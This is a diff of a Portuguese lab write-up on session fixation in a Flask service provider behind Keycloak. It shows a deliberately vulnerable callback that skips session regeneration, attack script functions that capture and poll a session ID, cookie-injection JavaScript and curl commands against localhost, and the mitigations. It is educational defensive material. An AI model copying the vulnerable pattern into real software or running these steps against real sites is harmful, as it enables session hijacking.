@@ -21,132 +21,275 @@ Se regenerasse, o ID fixado pelo atacante tornava-se inútil.
 
 ---
 
-## Passos da Demonstração
+## Análise do Código
 
-### 1. Verificar configuração vulnerável
+### 1. Flag de controlo — `sp1/config.py`
 
 ```python
-# sp1/config.py
-VULN_A09_NO_SESSION_REGEN = True   # ← deve estar True
+# True  = sistema VULNERÁVEL
+# False = mitigação ATIVA
+VULN_A09_NO_SESSION_REGEN = True
 ```
 
-### 2. Correr o script de ataque
+Esta flag é importada com `from config import *` e afecta exclusivamente
+a rota `/callback` — o único momento em que o session ID deve ser regenerado
+(imediatamente antes de escrever dados de autenticação na sessão).
 
-O script automatiza os passos do lado do atacante:
+---
 
-```bash
-python attacks/a09_session_fixation.py
+### 2. Configuração das sessões — `sp1/app.py`
+
+O SP1 usa `flask-session` com backend filesystem. Esta escolha é deliberada
+para tornar o ataque possível — o session ID é um valor real guardado no cookie:
+
+```python
+# sp1/app.py — configuração de sessões
+app.config["SESSION_TYPE"]            = "filesystem"
+app.config["SESSION_FILE_DIR"]        = "./flask_session"
+app.config["SESSION_COOKIE_NAME"]     = "sp1_session"
+app.config["SESSION_COOKIE_HTTPONLY"] = True
+app.config["SESSION_COOKIE_SAMESITE"] = "Lax"
+# ↑ Lax permite envio em navegação cross-site (ex: clicar num link)
+# Strict bloquearia a injecção — mas está propositadamente em Lax (VULN)
 ```
 
-O script irá:
-- Visitar o SP1 para obter um session ID válido
-- Mostrar o cookie a injectar no browser da vítima
-- Aguardar que a vítima faça login (verifica de 10 em 10 segundos)
+**Porquê `flask-session` e não o Flask padrão?**
 
-### 3. Injectar o cookie no browser da vítima
-
-O script mostra o session ID obtido, por exemplo:
+O Flask padrão usa cookies assinados (client-side):
 
 ```
-sp1_session = .eJyrVkrNS87PLShKLUpVslIqLU4tykvMTQUA...
+Cookie: session=eyJuYW1lIjoiYWxpY2UifQ.Zk9...  ← assinado com SECRET_KEY
 ```
 
-No browser da vítima, abrir a consola (F12) e executar:
+O atacante não consegue forjar a assinatura → Session Fixation **não funciona**.
 
-```javascript
-document.cookie = "sp1_session=.eJyrVkrNS87PLShKLUpVslIqLU4tykvMTQUA...; path=/";
-```
-
-Alternativa — injectar via `curl` simulando o browser da vítima:
-
-```bash
-# Verificar que o cookie está activo antes do login
-curl -s http://localhost:5001/ \
-  -b "sp1_session=.eJyrVkrNS87PLShKLUpVslIqLU4tykvMTQUA..." \
-  -o /dev/null -w "%{http_code}"
-```
-
-### 4. Vítima faz login com o cookie fixado
-
-No browser da vítima (com o cookie já injectado), aceder ao Portal A:
+Com `flask-session` (server-side):
 
 ```
-http://localhost:5001
+Cookie: sp1_session=.eJyrVkrNS87PLShKLUpVslIqLU4tykvMTQUA...
 ```
 
-Fazer login com:
-- **Username:** `bob`
-- **Password:** `bob123`
+O cookie é apenas um **identificador** — os dados ficam no servidor em `flask_session/`.
+O atacante pode obter um ID válido visitando o SP1 anonimamente e injectá-lo na vítima.
 
-O Keycloak autentica normalmente. O SP1 escreve os dados de `bob`
-na sessão associada ao ID fixado — **sem regenerar o ID**.
+---
 
-### 5. Atacante acede com o session ID fixo
+### 3. Rota `/callback` — o ponto crítico
 
-O script detecta automaticamente quando a sessão fica autenticada
-e mostra o comando para aceder:
+```python
+@app.route("/callback")
+def callback():
+    token     = oauth.keycloak.authorize_access_token()
+    user_info = token.get("userinfo")
 
-```bash
-curl -s http://localhost:5001/dashboard \
-     -b "sp1_session=.eJyrVkrNS87PLShKLUpVslIqLU4tykvMTQUA..." \
-     -L | grep -o "Bem-vindo.*<"
+    # ---- A-09: Session Fixation ----
+    if VULN_A09_NO_SESSION_REGEN:
+        # VULNERÁVEL: não faz nada — mantém o session ID actual
+        # Se o ID foi fixado pelo atacante, continua a ser o mesmo
+        pass
+        # session ID antes:  .eJyrVkrNS87P...  ← controlado pelo atacante
+        # session ID depois: .eJyrVkrNS87P...  ← IGUAL
+
+    else:
+        # MITIGADO: apaga a sessão actual e força criação de nova
+        session.clear()
+        # session ID antes:  .eJyrVkrNS87P...  ← controlado pelo atacante
+        # session ID depois: .eJyrZkrMS86O...  ← NOVO, aleatório
+
+    # Estes dados são escritos na sessão — seja ela do atacante ou nova
+    session["user"]         = user_info
+    session["access_token"] = token.get("access_token")
+    # Com VULN=True: os dados de "bob" ficam associados ao ID do atacante
+    # Com VULN=False: os dados ficam numa sessão nova que o atacante desconhece
 ```
 
-Ou no browser do atacante — definir o mesmo cookie na consola:
+**O `session.clear()` do `flask-session` faz duas coisas:**
+1. Apaga o ficheiro da sessão antiga em `flask_session/`
+2. Na próxima escrita (`session["user"] = ...`), cria um novo ficheiro com um ID diferente
+3. O browser recebe `Set-Cookie: sp1_session=<NOVO_ID>` na resposta
 
-```javascript
-document.cookie = "sp1_session=.eJyrVkrNS87PLShKLUpVslIqLU4tykvMTQUA...; path=/";
+---
+
+### 4. Como o atacante obtém o session ID — `attacks/a09_session_fixation.py`
+
+```python
+def get_fresh_session_id():
+    """
+    Visita o SP1 sem fazer login.
+    O SP1 cria uma sessão vazia e devolve o cookie sp1_session.
+    """
+    jar = http.cookiejar.CookieJar()
+    opener = urllib.request.build_opener(
+        urllib.request.HTTPCookieProcessor(jar)
+    )
+    opener.open("http://localhost:5001/")
+    # SP1 responde com:
+    # Set-Cookie: sp1_session=.eJyrVkrNS87PLShKLUpVslIqLU4tykvMTQUA...; Path=/
+
+    for cookie in jar:
+        if cookie.name == "sp1_session":
+            return cookie.value   # ← ID capturado
 ```
 
-Aceder a `http://localhost:5001/dashboard` — o atacante está autenticado
-como `bob` sem ter usado a password.
+O SP1 cria uma sessão para qualquer visita (incluindo não autenticadas) —
+este comportamento do `flask-session` é que torna o ataque possível.
+
+---
+
+### 5. Como o atacante verifica se a sessão foi autenticada
+
+```python
+def check_authenticated_access(session_id):
+    """
+    Tenta aceder a /dashboard com o session ID fixado.
+    Se não houver redirect para /login → sessão autenticada.
+    """
+    class NoRedirect(urllib.request.HTTPRedirectHandler):
+        def http_error_302(self, req, fp, code, msg, headers):
+            raise urllib.error.HTTPError(...)
+        http_error_301 = http_error_302
+        http_error_303 = http_error_302
+
+    req = urllib.request.Request("http://localhost:5001/dashboard")
+    req.add_header("Cookie", f"sp1_session={session_id}")
+
+    try:
+        opener = urllib.request.build_opener(NoRedirect())
+        opener.open(req)
+        return True    # 200 OK → sessão autenticada → ATAQUE SUCEDIDO
+    except urllib.error.HTTPError as e:
+        if e.code in (301, 302, 303):
+            return False  # redirect para /login → ainda não autenticada
+```
+
+O script verifica de 10 em 10 segundos. Quando a vítima faz login,
+o SP1 escreve `session["user"] = bob` na sessão do atacante → 200 OK.
 
 ---
 
 ## Diagrama do Ataque
 
 ```
-ATACANTE                    SP1                      VÍTIMA
-   │                         │                          │
-   │── GET /  ───────────────►│                          │
-   │◄── Set-Cookie: sp1_session=SID_FIXO ────────────── │
-   │                         │                          │
-   │  [Envia SID_FIXO à vítima via XSS / link / MITM]   │
-   │ ─────────────────────────────────────────────────► │
-   │                         │                          │
-   │                         │◄── GET / (com SID_FIXO) ─│
-   │                         │◄── POST login (Keycloak)  │
-   │                         │                          │
-   │                         │  [sem session.clear()!]  │
-   │                         │── session[user] = bob ──►│
-   │                         │   (mesmo SID_FIXO)       │
-   │                         │                          │
-   │── GET /dashboard ───────►│                          │
-   │   Cookie: SID_FIXO       │                          │
-   │◄── 200 OK (bob's data) ──│                          │
-   │                         │                          │
-[ACESSO COMO BOB SEM PASSWORD]
+ATACANTE                    SP1 :5001                    VÍTIMA
+   │                            │                           │
+   │── GET / ───────────────────►│                           │
+   │   (sem cookie)              │── cria sessão vazia       │
+   │◄── Set-Cookie: sp1_session=SID_FIXO ──────────────────  │
+   │                            │                           │
+   │  [Injeta SID_FIXO no browser da vítima]                 │
+   │  document.cookie = "sp1_session=SID_FIXO; path=/"       │
+   │ ──────────────────────────────────────────────────────► │
+   │                            │                           │
+   │                            │◄── GET / (Cookie: SID_FIXO)│
+   │                            │◄── redirect → Keycloak    │
+   │                            │◄── POST login (credenciais │
+   │                            │          reais de bob)     │
+   │                            │                           │
+   │                            │  if VULN_A09:             │
+   │                            │    pass  ← NÃO regenera   │
+   │                            │  session["user"] = bob    │
+   │                            │  (escrito no SID_FIXO)    │
+   │                            │                           │
+   │── GET /dashboard ──────────►│                           │
+   │   Cookie: SID_FIXO          │                           │
+   │◄── 200 OK (dados de bob) ───│                           │
+   │                            │                           │
+[ACESSO À SESSÃO DE BOB SEM SABER A PASSWORD]
 ```
 
 ---
 
-## Por que funciona?
+## Passos da Demonstração
+
+### 1. Verificar configuração vulnerável
 
 ```python
-# sp1/app.py — código vulnerável (callback após login)
-if VULN_A09_NO_SESSION_REGEN:
-    pass   # VULN: mantém o mesmo session ID
-
-# Dados do utilizador escritos na sessão com o ID do atacante
-session["user"]         = user_info
-session["access_token"] = token.get("access_token")
+# sp1/config.py
+VULN_A09_NO_SESSION_REGEN = True
 ```
 
-1. O SP1 usa sessões **server-side** com um ID real (cookie `sp1_session`)
-2. O atacante obtém um session ID válido visitando o SP1 anonimamente
-3. Injeta esse ID no browser da vítima
-4. A vítima autentica-se — o SP1 associa a autenticação ao ID existente
-5. O atacante já tem o ID → acede à sessão autenticada
+### 2. Correr o script de ataque
+
+```bash
+python attacks/a09_session_fixation.py
+```
+
+O script:
+- Visita o SP1 e captura o `sp1_session` cookie
+- Mostra o comando JavaScript a executar no browser da vítima
+- Fica em loop verificando se a sessão ficou autenticada
+
+### 3. Injectar o cookie no browser da vítima
+
+No browser da vítima, abrir a consola (F12 → Console) e executar:
+
+```javascript
+document.cookie = "sp1_session=.eJyrVkrNS87PLShKLUpVslIqLU4tykvMTQUA...; path=/";
+```
+
+### 4. Vítima faz login
+
+No mesmo browser, aceder a `http://localhost:5001` e fazer login com `bob` / `bob123`.
+
+### 5. Script detecta o ataque com sucesso
+
+O script mostra o comando para aceder como bob:
+
+```bash
+curl -s http://localhost:5001/dashboard \
+     -b "sp1_session=.eJyrVkrNS87PLShKLUpVslIqLU4tykvMTQUA..." \
+     -L
+```
+
+---
+
+## Mitigação — Análise do Código
+
+```python
+# sp1/config.py
+VULN_A09_NO_SESSION_REGEN = False
+```
+
+**Efeito no `/callback`:**
+
+```python
+if VULN_A09_NO_SESSION_REGEN:
+    pass   # ← NÃO executado
+
+else:
+    session.clear()   # ← EXECUTADO: destrói a sessão do atacante
+    # flask-session apaga flask_session/<SID_FIXO>
+    # Na próxima escrita é criado flask_session/<SID_NOVO>
+
+session["user"] = user_info
+# Os dados de bob ficam em <SID_NOVO> — que o atacante não conhece
+# O SID_FIXO aponta para uma sessão vazia/inexistente
+```
+
+**Defesas adicionais:**
+
+```python
+# sp1/app.py — com mitigação completa
+app.config["SESSION_COOKIE_SAMESITE"] = "Strict"
+# Strict: o cookie só é enviado em navegação first-party
+# → um link enviado pelo atacante não transporta o cookie fixado
+
+app.config["SESSION_COOKIE_HTTPONLY"] = True
+# Já activo: impede que JavaScript leia o cookie
+# → XSS não consegue roubar o session ID
+
+app.config["SESSION_COOKIE_SECURE"] = True
+# Produção: cookie só viaja em HTTPS
+# → MITM não consegue interceptar/injectar o cookie
+```
+
+**Tabela de condições:**
+
+| Condição | `VULN=True` | `VULN=False` |
+|----------|-------------|--------------|
+| Session ID fixado antes do login | ✅ mantido | ❌ destruído e substituído |
+| Atacante acede com ID fixado | ✅ sessão autenticada | ❌ sessão vazia |
+| SameSite=Strict activo | ❌ não | ✅ sim (mitigação adicional) |
 
 ---
 
@@ -154,42 +297,14 @@ session["access_token"] = token.get("access_token")
 
 | Condição | Presente no lab |
 |----------|-----------------|
-| Sessões server-side com ID no cookie | ✅ flask-session |
+| Sessões server-side com ID no cookie | ✅ `flask-session` filesystem |
 | Session ID não regenerado após login | ✅ `VULN_A09 = True` |
-| Atacante consegue injectar cookie na vítima | ✅ consola F12 / XSS |
+| Atacante consegue injectar cookie | ✅ consola F12 / XSS / MITM |
 
 > **Nota:** Sessões client-side (cookie assinado, como o Flask padrão)
 > **não são vulneráveis** a este ataque — o atacante não pode forjar
-> a assinatura. É por isso que o lab usa `flask-session` com filesystem.
-
----
-
-## Mitigação (Passo 7)
-
-```python
-# sp1/config.py
-VULN_A09_NO_SESSION_REGEN = False
-```
-
-Quando `False`, o SP1 executa `session.clear()` antes de escrever
-os dados do utilizador:
-
-```python
-# sp1/app.py — código com mitigação
-else:
-    session.clear()   # MITIGAÇÃO: novo session ID após login
-
-session["user"]         = user_info
-session["access_token"] = token.get("access_token")
-```
-
-`session.clear()` com `flask-session` apaga os dados da sessão antiga
-e força a criação de um novo ID — o ID fixado pelo atacante é abandonado.
-
-Defesas adicionais:
-- `SESSION_COOKIE_SAMESITE = "Strict"` — impede envio cross-site
-- `SESSION_COOKIE_HTTPONLY = True` — impede leitura via JavaScript (já activo)
-- `SESSION_COOKIE_SECURE = True` — apenas HTTPS (produção)
+> a assinatura criptográfica. É por isso que o lab usa `flask-session`
+> com filesystem, onde o cookie é apenas um identificador opaco.
 
 ---
 
